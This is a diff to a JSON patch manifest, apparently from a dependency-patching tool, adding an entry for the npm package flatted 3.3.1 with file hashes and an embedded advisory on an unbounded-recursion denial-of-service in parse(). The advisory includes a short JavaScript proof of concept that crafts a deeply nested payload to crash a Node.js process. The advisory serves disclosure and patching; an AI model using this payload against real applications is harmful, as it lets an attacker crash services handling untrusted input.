@@ -26,6 +26,49 @@
       "description": "",
       "license": "MIT",
       "tier": "free"
+    },
+    "pkg:npm/flatted@3.3.1": {
+      "uuid": "5cac955f-eab1-4d29-8f4f-c408a6cc9647",
+      "exportedAt": "Wed, 18 Mar 2026 22:53:26 GMT",
+      "files": {
+        "package/cjs/index.js": {
+          "beforeHash": "01ddc3dd9c12521e39f665c42fa28fee988cc9eafa872522d4e476574f8c8232",
+          "afterHash": "014ca3eb80dca2e1bd85f991f30be2d2c454a6d1db3e9e0497bdeb8d62f33f60"
+        },
+        "package/es.js": {
+          "beforeHash": "62e072809fdee3db5aa1eecc537105324527772c11a5ce7ac7883083bf84123b",
+          "afterHash": "2497bb3fd28f607548d6462b995f946d1ad11fa19398fc32c1755ce0c17e4d30"
+        },
+        "package/esm.js": {
+          "beforeHash": "60427d9991f5ad5fa1fd614077040d6d3c9cafa43cb64d2eab9eca680d50d1bf",
+          "afterHash": "6e56255f1b7c3a9fe42e92085c751f5526397f35585c73845bfb79c5ee76788a"
+        },
+        "package/esm/index.js": {
+          "beforeHash": "d7ef53b8643f8f771aa64cf44cd95389732989c9dfcfdb1305fb90276cd86bda",
+          "afterHash": "7fe8f8841453a2cad19a69ddb0f37ade9a7cee5cac768f1e47724e7f0242457a"
+        },
+        "package/index.js": {
+          "beforeHash": "e1fe5a0d9c279446e5997bba2b0cb37f7bf15f5005370e633a01e51bf410b074",
+          "afterHash": "b3e2346e194c55fb3fafabb9a846161cfb00acbdc2e7b2870c623cc1378722e0"
+        },
+        "package/min.js": {
+          "beforeHash": "2d1b28eac1a28cc3d3ab607ad56a0c20bd20f0df36b37d154804227ebded915b",
+          "afterHash": "9d9b44536c49a75b308db599afd988ed2fd8e5f173b6843c1a7f8169c7a94213"
+        }
+      },
+      "vulnerabilities": {
+        "GHSA-25h7-pfq9-p65f": {
+          "cves": [
+            "CVE-2026-32141"
+          ],
+          "summary": "flatted vulnerable to unbounded recursion DoS in parse() revive phase",
+          "severity": "HIGH",
+          "description": "## Summary\n\nflatted's `parse()` function uses a recursive `revive()` phase to resolve circular references in deserialized JSON. When given a crafted payload with deeply nested or self-referential `$` indices, the recursion depth is unbounded, causing a stack overflow that crashes the Node.js process.\n\n## Impact\n\nDenial of Service (DoS). Any application that passes untrusted input to `flatted.parse()` can be crashed by an unauthenticated attacker with a single request.\n\nflatted has ~87M weekly npm downloads and is used as the circular-JSON serialization layer in many caching and logging libraries.\n\n## Proof of Concept\n\n```javascript\nconst flatted = require('flatted');\n\n// Build deeply nested circular reference chain\nconst depth = 20000;\nconst arr = new Array(depth + 1);\narr[0] = '{\"a\":\"1\"}';\nfor (let i = 1; i <= depth; i++) {\n  arr[i] = `{\"a\":\"${i + 1}\"}`;\n}\narr[depth] = '{\"a\":\"leaf\"}';\n\nconst payload = JSON.stringify(arr);\nflatted.parse(payload); // RangeError: Maximum call stack size exceeded\n```\n\n## Fix\n\nThe maintainer has already merged an iterative (non-recursive) implementation in PR #88, converting the recursive `revive()` to a stack-based loop.\n\n## Affected Versions\n\nAll versions prior to the PR #88 fix."
+        }
+      },
+      "description": "",
+      "license": "MIT",
+      "tier": "free"
     }
   }
 }
